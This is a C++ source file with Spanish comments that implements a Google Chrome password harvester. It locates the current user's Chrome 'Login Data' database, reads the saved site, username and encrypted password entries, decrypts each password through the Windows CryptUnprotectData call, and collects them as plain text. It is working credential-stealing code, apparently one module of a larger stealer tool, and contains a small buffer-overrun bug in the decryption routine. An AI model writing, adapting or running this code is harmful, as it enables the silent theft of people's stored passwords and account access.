#include "chrome.h"



Chrome::Chrome()
{
}


Chrome::~Chrome()
{
}

char* Chrome::getRutaBD() {
	bool result = false;
	char rutaLAD[MAX_PATH] = {}; //rutaLocalAppData
	result = SHGetSpecialFolderPathA(0, rutaLAD, CSIDL_LOCAL_APPDATA, false);
	// devuelve la carpeta AppData\Local del usuario C:\Users\IEUser\AppData\Local
	//cout << "Local AppData: " + string(szProfileFolderPath) << endl;
	char rutaBDchrome[MAX_PATH] = "\\Google\\Chrome\\User Data\\Default\\Login Data";
	strcat(rutaLAD, rutaBDchrome);

	int size = strlen(rutaLAD) + 1;
	char* ret = (char*)calloc(size, 1);
	memcpy(ret, rutaLAD, size);
	return ret;

}

char* Chrome::getContraseñas(char* rutaBD) {
	//cout << " Chrome::conectarseBaseDeDatos " + string(rutaBD) << endl;
	string info = "------------------------- Google Chrome ------------------------- \n";
	sqlite3* db;
	if (sqlite3_open(rutaBD, &db) == SQLITE_OK) {
		sqlite3_stmt* stmt;
		int i = 0;
		if (sqlite3_prepare_v2(db, CONSULTA, -1, &stmt, 0) == SQLITE_OK)
		{
			//cout << "Haciendo consulta ..." << endl;
			while (sqlite3_step(stmt) == SQLITE_ROW)
			{
				string web = (const char*)sqlite3_column_text(stmt, 0);
				string usuario = (const char*)sqlite3_column_text(stmt, 1);
				string contraseña = descifrarPassword((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2));

				if (usuario != "" && contraseña != "")
				{
					//cout << web + " | " + usuario + " | " + contraseña << endl;
					info += web + " | " + usuario + " | " + contraseña + " \n";
				}
				i++;
			}
			if (i == 0) {
				cout << "No se han encontrado contraseñas" << endl;
				info += "Google Chrome no tiene contraseñas guardadas ";
			}
		}
	}
	else {
		cout << "No se ha podido conectar con la base de datos" << endl;
		info += "Error al encontrar la base de datos en chrome, posiblemente no está instalado";
	}

	//Return char* limpio
	char* info_char = &info[0u];
	int size = strlen(info_char) + 1;
	char* ret = (char*)calloc(size, 1);
	memcpy(ret, info_char, size);
	return ret;
}

const char* Chrome::descifrarPassword(BYTE * password, int size)
{
	DATA_BLOB in;
	DATA_BLOB out;

	in.pbData = password;
	in.cbData = (size + 1);
	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
	{

		/*

		CryptUnprotectData (Crypt32.dll) función que permite cifrar y descifrar la información si el usuario que ha cifrado la información
		tiene las mismas credenciales de inicio de sesión que el usuario que quiere descifrar la información

		*/

		out.pbData[out.cbData] = 0; // '\0' en la posición final del string 
		return ((const char*)out.pbData);
	}
	return ("Error \n");
}